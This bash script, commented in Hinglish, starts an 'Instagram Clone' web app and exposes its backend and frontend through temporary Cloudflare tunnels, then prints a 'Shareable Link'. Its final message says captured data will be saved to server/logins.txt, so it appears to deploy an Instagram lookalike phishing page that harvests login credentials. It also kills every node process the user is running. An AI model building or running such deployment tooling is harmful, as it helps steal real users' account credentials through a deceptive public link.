#!/bin/bash

# Instagram Clone Online Setup Script
# Run this from the MernStack/Instagram directory

echo "🚀 Starting Instagram Clone Online Setup..."

# Get absolute path to the project root
PROJECT_ROOT=$(pwd)

# 1. Purane processes ko band karein
echo "🧹 Cleaning up old processes..."
pkill -u $USER -f cloudflared 2>/dev/null
pkill -u $USER -f node 2>/dev/null
sleep 2

# 2. Backend start karein (Port 5000)
echo "⏳ Starting Backend on Port 5000..."
# Install dependecies if not present, then start
(cd "$PROJECT_ROOT/server" && npm install && npm run dev > "$PROJECT_ROOT/backend.log" 2>&1) &
sleep 5

# 3. Backend Tunnel create karein (Cloudflare)
echo "🔗 Creating Backend Public URL..."
rm -f "$PROJECT_ROOT/backend_cf.txt"
npx cloudflared tunnel --url http://localhost:5000 > "$PROJECT_ROOT/backend_cf.txt" 2>&1 &

# Wait for URL to appear in backend_cf.txt
BACKEND_URL=""
echo "⏳ Waiting for Cloudflare URL (this may take 20-30 seconds)..."
for i in {1..20}; do
    # Try to find the URL in the file
    BACKEND_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' "$PROJECT_ROOT/backend_cf.txt" | head -n 1)
    if [ ! -z "$BACKEND_URL" ]; then
        break
    fi
    sleep 3
done

if [ -z "$BACKEND_URL" ]; then
    echo "❌ Backend URL nahi mil paya. backend_cf.txt contents:"
    cat "$PROJECT_ROOT/backend_cf.txt"
    exit 1
fi
echo "✅ Backend Live at: $BACKEND_URL"

# 4. Frontend update karein (New Backend URL)
echo "⚙️ Updating Frontend configuration..."
# Sed use karke BACKEND_URL update karein App.jsx mein
# Regex match: line starting with const BACKEND_URL
sed -i -c "s|const BACKEND_URL = .*|const BACKEND_URL = '$BACKEND_URL';|" "$PROJECT_ROOT/client/src/App.jsx"

# 5. Frontend start karein (Port 3000 according to vite.config.js)
echo "⏳ Starting Frontend on Port 3000..."
(cd "$PROJECT_ROOT/client" && npm install && npm run dev > "$PROJECT_ROOT/frontend.log" 2>&1) &
sleep 10

# 6. Frontend Tunnel create karein
echo "🔗 Creating Final Shareable Link..."
rm -f "$PROJECT_ROOT/frontend_cf.txt"
npx cloudflared tunnel --url http://localhost:3000 > "$PROJECT_ROOT/frontend_cf.txt" 2>&1 &

# Wait for Frontend URL
FRONTEND_URL=""
for i in {1..20}; do
    FRONTEND_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' "$PROJECT_ROOT/frontend_cf.txt" | head -n 1)
    if [ ! -z "$FRONTEND_URL" ]; then
        break
    fi
    sleep 3
done

if [ -z "$FRONTEND_URL" ]; then
    echo "❌ Frontend URL nahi mil paya. frontend_cf.txt contents:"
    cat "$PROJECT_ROOT/frontend_cf.txt"
    exit 1
fi

echo "------------------------------------------------"
echo "🎉 SAB KUCH READY HAI!"
echo "👉 Shareable Link: $FRONTEND_URL"
echo "📂 Data save hoga: MernStack/Instagram/server/logins.txt"
echo "------------------------------------------------"
echo "Press Ctrl+C to stop the servers."

# Keep the script running
wait
